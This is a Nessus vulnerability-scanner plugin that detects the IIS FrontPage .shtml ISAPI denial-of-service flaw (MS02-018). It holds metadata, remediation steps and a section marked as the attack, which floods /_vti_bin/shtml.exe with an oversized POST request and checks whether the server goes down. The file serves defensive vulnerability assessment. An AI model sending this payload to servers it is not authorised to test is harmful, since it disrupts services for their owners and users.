#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Thanks to: SPIKE v2.1 :)
#
# MS02-018 supercedes : MS01-043, MS01-025, MS00-084, MS00-018, MS00-006
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10937);
 script_bugtraq_id(1066, 4479);
 script_cve_id("CVE-2002-0072");
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2002-A-0002");
 script_version ("$Revision: 1.25 $");
 
 name["english"] = "IIS FrontPage ISAPI Denial of Service";

 script_name(english:name["english"]);

 desc["english"] = "
There's a denial of service vulnerability on the remote host
in the Front Page ISAPI filter.

An attacker may use this flaw to prevent the remote service
from working properly.

Solution: See http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx
Risk factor : High";

 script_description(english:desc["english"]);

 # Summary
 summary["english"] = "Tests for a DoS in IIS";
 script_summary(english:summary["english"]);

 # Category
 script_category(ACT_MIXED_ATTACK);

 # Dependencie(s)
 script_dependencie("http_version.nasl", "iis_asp_overflow.nasl");

 # Family
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],
               francais:family["francais"]);

 # Copyright
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
                  francais:"Ce script est Copyright (C) 2002 Renaud Deraison");

 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);


res = is_cgi_installed_ka(item:"/_vti_bin/shtml.exe", port:port);
if(!res)exit(0);

banner = get_http_banner(port:port);
if (! banner ) exit(0);
if ( egrep(pattern:"^Server:.*IIS/[45]\.", string:banner) ) exit(0);

if(safe_checks())
{
 if ( get_kb_item("Q319733") ) exit(0);

 desc = "
The IIS server appears to have the .SHTML ISAPI filter mapped.

At least one remote vulnerability has been discovered for the
.SHTML filter. This is detailed in Microsoft Advisory MS02-018
and results in a denial of service access to the web server. 

It is recommended that even if you have patched this vulnerability that
you unmap the .SHTML extension, and any other unused ISAPI extensions
if they are not required for the operation of your site.

An attacker may use this flaw to prevent the remote service
from working properly.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled

Solution: See 
http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx
and/or unmap the shtml/shtm isapi filters.

To unmap the .shtml extension:
 1.Open Internet Services Manager. 
 2.Right-click the Web server choose Properties from the context menu. 
 3.Master Properties 
 4.Select WWW Service -> Edit -> HomeDirectory -> Configuration 
and remove the reference to .shtml/shtm and sht from the list.

Risk factor : Medium";

    security_hole(port:port, data:desc);
  exit(0);
}

if(get_port_state(port))
{

# The attack starts here
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 close(soc);

 for(i=0;i<5;i=i+1)
 {
 soc = open_sock_tcp(port);
 if ( ! soc )
 {
	if ( i != 0 ) security_hole(port);
	exit(0);
 }
 req = http_post(item:string("/_vti_bin/shtml.exe?", crap(35000), ".html"), port:port);
 send(socket:soc, data:req);
 close(soc);
 sleep(2);
 soc = open_sock_tcp(port);
 if(!soc){
 	security_hole(port);
	exit(0);
	}
 close(soc);
 }
}
